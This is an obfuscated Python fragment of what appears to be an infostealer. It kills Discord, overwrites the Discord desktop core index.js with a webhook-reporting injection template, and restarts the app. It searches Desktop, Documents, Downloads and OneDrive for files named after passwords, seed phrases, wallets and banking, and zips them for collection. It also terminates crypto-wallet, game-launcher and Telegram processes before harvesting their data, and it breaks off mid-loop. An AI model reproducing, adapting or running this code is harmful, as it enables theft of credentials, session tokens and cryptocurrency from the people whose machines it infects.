module.exports = require('./core.asar');"""

def FFDZXZNIFUJEZDMBSIVTPCTFJVAKLKUBRRJKIKVVJNPAWBYNHPPGYGNBEMGCYKCRCBIIUKHBMOSLCDZOFRDAJUQLYKGWH():
    import os
    import re
    import subprocess
    import psutil

    FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY = "Active"

    def ZESYENAJCDCRMCFETPMDQIQAAZXBXRZOLKBRDYEVPXPRNWGYFJOSKWWESGITYBAZGKTHXODGUHXBOEIZZI(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ):
        for v4r_file in os.listdir(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ):
            if re.search(r'app-+?', v4r_file):
                UURQTEDORRZPBNNYQPUCGEPCBOPAXBQTLJUDGODTFWGEKYCUCOBMURWWENLHBFHSDKEKXOPSOJMGYDFZT = IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ + '\\' + v4r_file + '\\modules'
                if not os.path.exists(UURQTEDORRZPBNNYQPUCGEPCBOPAXBQTLJUDGODTFWGEKYCUCOBMURWWENLHBFHSDKEKXOPSOJMGYDFZT):
                    continue
                for v4r_file in os.listdir(UURQTEDORRZPBNNYQPUCGEPCBOPAXBQTLJUDGODTFWGEKYCUCOBMURWWENLHBFHSDKEKXOPSOJMGYDFZT):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB = UURQTEDORRZPBNNYQPUCGEPCBOPAXBQTLJUDGODTFWGEKYCUCOBMURWWENLHBFHSDKEKXOPSOJMGYDFZT + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB, v4r_file
        return None

    def JSSRRGOJGTZAWGVQNIXAQCNQBMBXEBLNHTEFSIKRLJIWGOECWSIOILSJDZGZRWK(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ):
        EHDYFUZSBVGEAAZHGGIGDLBUSLDSXXEIOBETTTPEGJAYOKGMQDWSH = IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ + '\\Update.exe'
        BKMVKWYLJKQZNRLPOLBZITAUONYQIJBFXDSCSKUQYHNNQPLLSWWQZQNLD = IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ):
            if re.search(r'app-+?', v4r_file):
                RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNA = IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ + '\\' + v4r_file
                if os.path.exists(RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNA + '\\' + 'modules'):
                    for v4r_file in os.listdir(RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNA):
                        if v4r_file == BKMVKWYLJKQZNRLPOLBZITAUONYQIJBFXDSCSKUQYHNNQPLLSWWQZQNLD:
                            BKMVKWYLJKQZNRLPOLBZITAUONYQIJBFXDSCSKUQYHNNQPLLSWWQZQNLD = RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNA + '\\' + BKMVKWYLJKQZNRLPOLBZITAUONYQIJBFXDSCSKUQYHNNQPLLSWWQZQNLD
                            subprocess.call([EHDYFUZSBVGEAAZHGGIGDLBUSLDSXXEIOBETTTPEGJAYOKGMQDWSH, '--processStart', BKMVKWYLJKQZNRLPOLBZITAUONYQIJBFXDSCSKUQYHNNQPLLSWWQZQNLD],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def EHFEIHIIPWJUIKYAIRBPKYQNYMVFKNMOQCEMLFHAXHIUGUGHWMHBBEXMMJCFRQFWJWLWUGUPGRYEOIMYYOFXCPTQAVKUVQEYIFB():
        RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNAdata = os.getenv('LOCALAPPDATA')
        SEVZRYEMYMCNNXGOWXCNVAOSSPFSLPTEMJOTPBQFFMCKLPEUENAUXLPTJZLAGBFXKAMZZHVN = [
            RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNAdata + '\\Discord',
            RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNAdata + '\\DiscordCanary',
            RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNAdata + '\\DiscordPTB',
            RWGWSTVEJJVGYIYMCGTEGDDBSMLGESILOQIZRVWQSUYSDNQGFBFKDRQJQXJFARNUEPGPMYRNAdata + '\\DiscordDevelopment'
        ]
        LZGEGSRQRGLINPFGWSBSTMGXKAFYFSLPPWTJOQODEHIKPBREKFGNW = RCJSCHMEDGEVUASLCBIICTETCAZGAVMGHQLZTOLIEFNVFNLDLDXJBIZQJCTEFTFNO

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ in SEVZRYEMYMCNNXGOWXCNVAOSSPFSLPTEMJOTPBQFFMCKLPEUENAUXLPTJZLAGBFXKAMZZHVN:
            if not os.path.exists(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ):
                continue

            XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB_info = ZESYENAJCDCRMCFETPMDQIQAAZXBXRZOLKBRDYEVPXPRNWGYFJOSKWWESGITYBAZGKTHXODGUHXBOEIZZI(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ)
            if XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB_info is not None:
                XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB, XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB_file = XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB_info
                
                ZGLNIMQIQXAFZVZQBUMJHOUZJOUFKQLAIHVSZNZKWUVNVVHJBAMSHSFNCINQSOXGTPJQFTPBIBIFSRDQGUDDUCSOT = XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB + '\\index.js'
                
                if not os.path.exists(ZGLNIMQIQXAFZVZQBUMJHOUZJOUFKQLAIHVSZNZKWUVNVVHJBAMSHSFNCINQSOXGTPJQFTPBIBIFSRDQGUDDUCSOT):
                    open(ZGLNIMQIQXAFZVZQBUMJHOUZJOUFKQLAIHVSZNZKWUVNVVHJBAMSHSFNCINQSOXGTPJQFTPBIBIFSRDQGUDDUCSOT, 'w').close()

                with open(ZGLNIMQIQXAFZVZQBUMJHOUZJOUFKQLAIHVSZNZKWUVNVVHJBAMSHSFNCINQSOXGTPJQFTPBIBIFSRDQGUDDUCSOT, 'w', encoding='utf-8') as f:
                    f.write((LZGEGSRQRGLINPFGWSBSTMGXKAFYFSLPPWTJOQODEHIKPBREKFGNW).replace('discord_desktop_core-1', XRPSAENIVAAJPUSBWVCERTJTMLCWDKJWVAOMFWGNVDKFRZEJWAXVDVNGXVXXMZMEVHBCCWASGEQEEBQNLDMKYBDLYB_file)
                            .replace(r"%WEBHOOK_HERE%", HYVTIEFNXQGBLJNECPXXVUFBSKQCXIBXJLUAJXFHHINHZGPRPBPHEDJRZPCLPYGFJ)
                            .replace(r"%EMBED_COLOR%", str(RIXLEQPLMUHMSSKQPPMAGAQPAGTOYFFAWGQWWADVLQJNNTLPOEZMZDMYDWHBZPIVZSSQQZPIIULKGZI))
                            .replace(r"%USERNAME%", SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB)
                            .replace(r"%IP_PUBLIC%", GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR)
                            .replace(r"%EMBED_NAME%", ZCNCOZGPXXOICJMAUBKAUBCDZIQMNZOUDYETYKRNAKGUNDQQAJCVRBWBZZHBRWGWGPZZOJVNRSUGZSOZQXRRSFOTUJAKVZSSAWW)
                            .replace(r"%EMBED_ICON%", IFISLJOHJJNLKZHKCUXIHVQOJWNFURSZKKHCUZLITEBCGQGXAPMAXSLVNTVKIZPYJVGQPAXJMCBSYCOW)
                            .replace(r"%FOOTER_TEXT%", KBICMAEAARZZJSSWCJLBCDUJCLAVGGAHNWRAAELNTSVEBKLVXWDFFRTFQXVVNGGCNCJJDTYTDWFKU)
                            .replace(r"%WEBSITE%", UGKWLMDLRNBABFZLBRHWLSYHBUFZDIQCKWRWBKPXYUKYUAEASPPNHT))
                JSSRRGOJGTZAWGVQNIXAQCNQBMBXEBLNHTEFSIKRLJIWGOECWSIOILSJDZGZRWK(IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJ)
                
    EHFEIHIIPWJUIKYAIRBPKYQNYMVFKNMOQCEMLFHAXHIUGUGHWMHBBEXMMJCFRQFWJWLWUGUPGRYEOIMYYOFXCPTQAVKUVQEYIFB()
    return FFINAXAURGQGKCPFDVSBNGUAJJLFDUQPBISTNRVNUCZZVGFBUEXSQXZDZJAQCHQY

def JTQFHFNLMVNTIKLIZLDNNDYFEEXICZTREIWUQFRJURITVUBPFXUMVEVTGZDTQLLPVIFFGGEAUNHQKCDJOQOTFRAZGMVAJB(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import os
    import random

    JLLDPKKLKAACSLNUJNCIIFKKPTMXZBJJXDLWQVERWUZRFXNCLLJRPUUUGPNQPEEMLAZXFXPUPIYVFTQPJYFXJSIQVYKCSNOSGAHZ = [
        os.path.join(ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX, "Desktop"),
        os.path.join(ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX, "Downloads"),
        os.path.join(ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX, "Documents"),
        os.path.join(ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX, "Picture"),
        os.path.join(ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX, "Video"),
        os.path.join(ESGAUWSLPCVQROOBWOZIVMTSLJVKSMHCPAIJIZRMPXRELAHBDPUFDYAZYGIQFYBTMWACVGZNIWJXYLYGTHRUZZZNSNEZFFX, "OneDrive"),
        os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Microsoft", "Windows", "Recent")
    ]

    GWQSWGOIEZMKCTPFUOCYMCKKWGQLZHZHVKAPHCSVBSQGLWZYMHTJSGLYEOZMMPKIAGUJPwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB_files = []

    for LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL in JLLDPKKLKAACSLNUJNCIIFKKPTMXZBJJXDLWQVERWUZRFXNCLLJRPUUUGPNQPEEMLAZXFXPUPIYVFTQPJYFXJSIQVYKCSNOSGAHZ:
        for v4r_root, IQFLKWDWVTWJFSIKOUNQCBRRISLDKIWYZHQFVFMPGTDUUNFKOTPSPLLMMVLCHQPLQNESXNQADCULHEOOUSKJs, v4r_files in os.walk(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        NRKJTDKBTRFLKWIGCWTSYSEOPYEHEYBZKTSHHBFZWAKWNQYTGKAKDXAWBNHUULZMYABCAJBHEF = os.path.splitext(v4r_file)[0].lower()
                        for GWQSWGOIEZMKCTPFUOCYMCKKWGQLZHZHVKAPHCSVBSQGLWZYMHTJSGLYEOZMMPKIAGUJPword in GWQSWGOIEZMKCTPFUOCYMCKKWGQLZHZHVKAPHCSVBSQGLWZYMHTJSGLYEOZMMPKIAGUJPwords:
                            try:
                                if GWQSWGOIEZMKCTPFUOCYMCKKWGQLZHZHVKAPHCSVBSQGLWZYMHTJSGLYEOZMMPKIAGUJPword.lower() == NRKJTDKBTRFLKWIGCWTSYSEOPYEHEYBZKTSHHBFZWAKWNQYTGKAKDXAWBNHUULZMYABCAJBHEF:
                                    TIURLMDVPRIAKDIZZTAISPPDAIIUHAZXMOIHMSEJYIXKZOJXPPNVEFQEQCDCWBIVYXRYEODQBTUVSRMMKLMIQBIDKMKETY = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(TIURLMDVPRIAKDIZZTAISPPDAIIUHAZXMOIHMSEJYIXKZOJXPPNVEFQEQCDCWBIVYXRYEODQBTUVSRMMKLMIQBIDKMKETY):
                                        MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB_files.append(v4r_file)
                                        v4r_base_name, BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAI = os.path.splitext(v4r_file)
                                        with open(TIURLMDVPRIAKDIZZTAISPPDAIIUHAZXMOIHMSEJYIXKZOJXPPNVEFQEQCDCWBIVYXRYEODQBTUVSRMMKLMIQBIDKMKETY, "rb") as v4r_f:
                                            TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + BLBQOAHHMNMSUDWOGAMRPUZKXFJHSSBTGFXLPSTHEKKJEDABQEBFXVQDPBEWQBLVBWZHVFETDYTAQPVPCBIPCAI), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB_files:
        MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW = sum(len(phrase.split()) for phrase in MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB_files)
    else:
        MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW = 0

    return MWIKAZDZESBWGLWXWWGBLKSRPUHLVHDKGVHQTYXNSFZYPZNHURBDKEHCQEJPW

def ERZBOVJUDQWKNKHPPOAJIVZDYCOCPDZWTLGPTMARVCWKBNNITVWRULLBTZXIRFUPMUKKLNNERGNYEJCKQJGVKJOQYJXBWLCHI(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import os
    import psutil

    ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV = ["Wallets", "Game Launchers", "Apps"]
    BDSYFJWYTEIAWZCGBZCUWXCEVALQSNBEASZOBYFMWHSSRBSRBVVTZRFLBJLLXFIWQBWM         = [] if "Wallets" in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV else None
    YOBBMITFYTRGPQRBPFDJMMDCKLXEWBTZTROYEOSHUIAZFHSVYQ  = [] if "Game Launchers" in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV else None
    QQDVRMHCBLNNJIONXKYGMYERZUGYOESQEJYDRUAPBIZALTIUKACZIOZTJCETSCBDTOYBFWHONYSIXQQMXLZBYPH            = [] if "Apps" in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV else None

    MDNTVYKQRGDDAXNZEYGFZRVXBHYEYBPROKWWVJGRKKBWIIZMVZA = [
        ("Zcash",             os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(JIFDGZNLAATJFOTHTVZRSGLFPINVQLJCZZKOMWWOTOQKLBZLJFGOLVUFJCHEPPXBKYBGDMGAOHNWKUHYDOCBSSLGFSSEFRNIRR, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_proc_name, v4r_type in MDNTVYKQRGDDAXNZEYGFZRVXBHYEYBPROKWWVJGRKKBWIIZMVZA:
            if v4r_type in ACDJVABPEUOIBGNPXMZMTYHWSNLPXCOPYPCKBFWTHWEPNEXXKFFKXDGVFEJDWZJSKYMSSCTXIJOIOBVSGYVMWQPTV:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_proc_name, v4r_type in MDNTVYKQRGDDAXNZEYGFZRVXBHYEYBPROKWWVJGRKKBWIIZMVZA:
